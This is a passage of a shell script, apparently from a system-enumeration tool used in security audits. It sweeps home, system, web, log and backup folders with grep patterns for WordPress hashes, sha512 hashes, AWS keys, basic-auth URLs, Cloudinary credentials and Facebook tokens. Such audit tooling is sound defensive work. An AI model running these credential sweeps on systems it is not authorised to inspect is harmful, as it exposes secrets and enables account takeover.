print_3title_no_nl "Searching Wordpress (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "\$P\$[a-zA-Z0-9_/\.]{31}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
echo ''
print_2title "Searching Raw Hashes"
print_3title_no_nl "Searching sha512 (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
echo ''
print_2title "Searching APIs"
print_3title_no_nl "Searching AWS Client ID (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}" '{}' \; 2>/dev/null | grep -Ev ":#|:<\!\-\-" | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching AWS MWS Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching AWS Secret Key (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Basic Auth Credentials (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "://[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-zA-Z0-9]+\.[a-zA-Z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Cloudinary Basic Auth (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Facebook Access Token (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private/var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /usr/local/www/ -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find $backup_folders_row -type f -not -path "*/node_modules/*" -exec grep -HnRIE "EAACEdEose0cBA[0-9A-Za-z]+" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
fi
wait
print_3title_no_nl "Searching Facebook Client ID (limited to 50)..."
if [ "$SEARCH_IN_FOLDER" ]; then
  timeout 120 find "$ROOT_FOLDER" -type f -not -path "*/node_modules/*" -exec grep -HnRiIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
else
  timeout 120 find $HOMESEARCH -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /etc -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /opt -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /tmp -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /private -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /Applications -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/www -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
  timeout 120 find /var/log -type f -not -path "*/node_modules/*" -exec grep -HnRIE "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['\"][0-9]{13,17}" '{}' \; 2>/dev/null  | sed '/^.\{150\}./d' | sort | uniq | head -n 50 &
